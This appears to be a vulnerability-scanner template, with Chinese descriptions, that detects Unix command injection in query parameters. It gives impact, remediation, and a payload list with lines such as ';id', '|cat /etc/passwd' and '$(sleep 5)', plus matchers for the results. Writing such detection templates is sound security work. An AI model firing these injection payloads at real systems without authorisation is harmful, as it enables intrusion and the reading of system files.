id: unix-command-injection

info:
  name: Unix 命令注入 - 通用检测（DAST）
  author: Jaenact
  severity: high
  description: |
    Unix/Linux 命令注入发生在应用把用户输入拼接进 shell 命令，攻击者可利用分号、管道、逻辑运算符、反引号、命令替换或换行改变命令语义。模板用 `id`、读取 `/etc/passwd` 和 `sleep 5` 等载荷替换查询参数，并通过命令输出正则或响应延时确认执行。
  impact: |
    - 攻击者可在底层 Unix/Linux 系统上执行任意命令，读取敏感文件、窃取凭据、横向移动或造成拒绝服务。
    - Web 进程权限越高，命令注入造成的主机接管和数据泄露范围越大。
  remediation: |
    - 不要将用户输入直接传给 shell；优先使用参数化 API、语言原生库或固定命令参数数组。
    - 对必须保留的命令调用实施白名单校验、参数转义、最小权限账户、容器隔离和审计告警。
  reference:
    - https://owasp.org/www-community/attacks/Command_Injection
    - https://cwe.mitre.org/data/definitions/78.html
    - https://capec.mitre.org/data/definitions/88.html
    - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 15
  tags: cmdi,dast,rce,unix,linux,fuzz,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        # shell separators with id
        - ";id"
        - "|id"
        - "&&id"
        - "`id`"
        - "$(id)"
        # file read
        - ";cat /etc/passwd"
        - "|cat /etc/passwd"
        - "$(cat /etc/passwd)"
        # newline injection
        - "%0aid"
        - "%0acat+/etc/passwd"
        # time-based
        - ";sleep 5"
        - "|sleep 5"
        - "&&sleep 5"
        - "$(sleep 5)"
        - "`sleep 5`"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: regex
        name: id-output
        part: body
        regex:
          - 'uid=\d+\([^)]+\)\s+gid=\d+'

      - type: regex
        name: etc-passwd
        part: body
        regex:
          - 'root:.*:0:0:'

      - type: dsl
        name: time-based
        dsl:
          - 'duration >= 4'
